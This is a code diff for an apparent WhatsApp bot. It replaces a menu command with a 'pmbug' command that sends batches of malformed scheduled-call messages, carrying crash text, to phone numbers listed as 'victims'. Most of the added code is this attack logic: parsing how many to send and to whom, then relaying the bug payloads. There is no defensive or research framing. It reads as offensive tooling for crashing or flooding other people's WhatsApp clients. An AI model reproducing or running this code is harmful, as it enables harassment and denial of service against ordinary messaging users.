@@ -112,77 +112,85 @@ async function sendbug(dest, zk, ms, repondre, amount, victims, bug) {
 }
 
 
-// --cmds--
-
-// bug menu
 zokou(
     {
-        nomCom: "🐛",
+        nomCom: "pmbug",
         categorie: category,
         reaction: reaction
     },
 
     async (dest, zk, commandOptions) => {
-        const { ms, arg, repondre } = commandOptions;
-        const mono = "```";
-        const time = moment().tz(conf.TZ).format("HH:mm:ss");
-        const versions = ["v1", "v2"];
-        const version = versions[Math.floor(Math.random() * versions.length)];
-        const menuImage = fs.readFileSync(
-            path.resolve(
-                path.join(__dirname, "..", "media", "deleted-message.jpg")
-            )
-        );
-        const tumbUrl =
-            "https://i.ibb.co/wyYKzMY/68747470733a2f2f74656c656772612e70682f66696c652f6530376133643933336662346361643062333739312e6a7067.jpg";
-        let menu = `${mono}Hello ${ms.pushName}
-${timewisher(time)}
-
-
-
-┗❏${mono}`;
-        switch (version) {
-            case "v1":
-                {
-                    zk.sendMessage(
-                        dest,
-                        {
-                            image: menuImage,
-                            caption: menu
-                        },
-                        { quoted: ms }
+        const { ms, arg, repondre, superUser, prefixe } = commandOptions;
+        if (!superUser) return await repondre(mess.prem);
+        if (!arg[0])
+            return await repondre(
+                `Use ${prefixe}pmbug amount | numbers\n> Example ${prefixe}pmbug 30 |${
+                    conf.NUMERO_OWNER
+                } or ${prefixe}pmbug ${conf.NUMERO_OWNER.split(",")[0]}`
+            );
+        await loading(dest, zk);
+        const text = arg.join("");
+        let amount = 30;
+        let victims = [];
+        const bug = {
+            scheduledCallCreationMessage: {
+                callType: "2",
+                scheduledTimestampMs: `${moment(1000)
+                    .tz("Asia/Kolkata")
+                    .format("DD/MM/YYYY HH:mm:ss")}`,
+                title: `${bugtext1}`
+            }
+        };
+        if (arg.length === 1) {
+            victims.push(arg[0]);
+            await repondre(`sending ${amount} bugs to ${victims[0]}`);
+            try {
+                await relaybug(dest, zk, ms, repondre, amount, victims, bug);
+            } catch (e) {
+                await repondre("An error occured");
+                console.log(`An error occured: ${e}`);
+                await react(dest, zk, ms, "⚠️");
+            }
+        } else {
+            amount = parseInt(text.split("|")[0].trim());
+            if (
+                amount > conf.BOOM_MESSAGE_LIMIT ||
+                isNaN(amount) ||
+                amount < 1
+            ) {
+                return await repondre(
+                    `amount must be a valid intiger between 1-${conf.BOOM_MESSAGE_LIMIT}`
+                );
+            } else {
+                victims = text
+                    .split("|")[1]
+                    .split(",")
+                    .map(x => x.trim())
+                    .filter(x => x !== "");
+                if (victims.length > 0) {
+                    await repondre(
+                        `sending ${amount} bugs to ${victims.join(", ")}`
                     );
+                    try {
+                        await relaybug(
+                            dest,
+                            zk,
+                            ms,
+                            repondre,
+                            amount,
+                            victims,
+                            bug
+                        );
+                    } catch (e) {
+                        await repondre("An error occured");
+                        console.log(`An error occured: ${e}`);
+                        await react(dest, zk, ms, "⚠️");
+                    }
+                } else {
+                    return await repondre("No victims specfied");
                 }
-                break;
-            case "v2":
-                {
-                    zk.sendMessage(
-                        dest,
-                        {
-                            image: menuImage,
-                            caption: menu,
-                            contextInfo: {
-                                mentionedJid: [ms.key.remoteJid],
-                                forwardingScore: 9999999,
-                                isForwarded: true,
-                                externalAdReply: {
-                                    showAdAttribution: true,
-                                    title: `${conf.BOT}`,
-                                    body: `Bot Created By ${conf.OWNER_NAME}`,
-                                    thumbnail: { url: tumbUrl },
-                                    thumbnailUrl: tumbUrl,
-                                    previewType: "PHOTO",
-                                    sourceUrl:
-                                        "https://whatsapp.com/channel/0029VaeRrcnADTOKzivM0S1r",
-                                    mediaType: 1,
-                                    renderLargerAbhinail: true
-                                }
-                            }
-                        },
-                        { quoted: ms }
-                    );
-                }
-                break;
+            }
         }
+        await react(dest, zk, ms, "✅");
     }
-)
+);
